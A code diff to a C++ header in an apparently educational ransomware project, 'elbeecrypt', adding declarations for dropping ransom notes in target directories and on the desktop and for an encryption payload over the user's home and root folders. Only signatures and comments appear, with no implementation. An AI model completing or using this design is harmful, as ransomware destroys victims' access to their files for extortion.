@@ -1,6 +1,13 @@
 #pragma once
 
+#include <filesystem>
 #include <string>
+#include <tuple>
+#include <vector>
+
+#include "elbeecrypt/common/io/cryptor-engine.hpp"
+
+namespace fs = std::filesystem;
 
 /**
  * @brief Contains the function definitions for the
@@ -12,6 +19,21 @@
  */
 namespace elbeecrypt::cryptor::Main {
 	/**
+	 * @brief Drops a ransom note in all of the given directories.
+	 * 
+	 * @param targets The target directories to drop the ransom note in
+	 * @param cEngine The cryptor engine that encrypted the files
+	 * @param roots The root paths that were hit
+	 * @param encrypted The list of files that were encrypted
+	 * @param homeFolderDesktop The user's desktop location
+	 */
+	void dropRansomNote(
+		const std::vector<fs::path>& targets, common::io::CryptorEngine& cEngine, 
+		const std::vector<fs::path>& roots, const std::vector<fs::path>& encrypted,
+		const fs::path& homeFolderDesktop
+	);
+
+	/**
 	 * @brief Prompts the user warning them of potential system damage.
 	 * Serves as a safety net in case the user accidentally launched the
 	 * program on their system.
@@ -22,6 +44,18 @@ namespace elbeecrypt::cryptor::Main {
 
 	/**
 	 * @brief Runs the encryption payload of the ransomware.
+	 * 
+	 * @param homeFolder The user's home folder
+	 * @param roots The list of root directories to target
+	 * @return A list of the files that were successfully encrypted and the cryptor engine instance that was used
 	 */
-	void encrypt();
+	std::tuple<std::vector<fs::path>, elbeecrypt::common::io::CryptorEngine> encrypt(const fs::path& homeFolder, const std::vector<fs::path>& roots);
+
+	/**
+	 * @brief Writes a line to a file.
+	 * 
+	 * @param target The path to the file
+	 * @param content The content to write to the file
+	 */
+	void writeToFile(const fs::path& target, std::string content);
 }
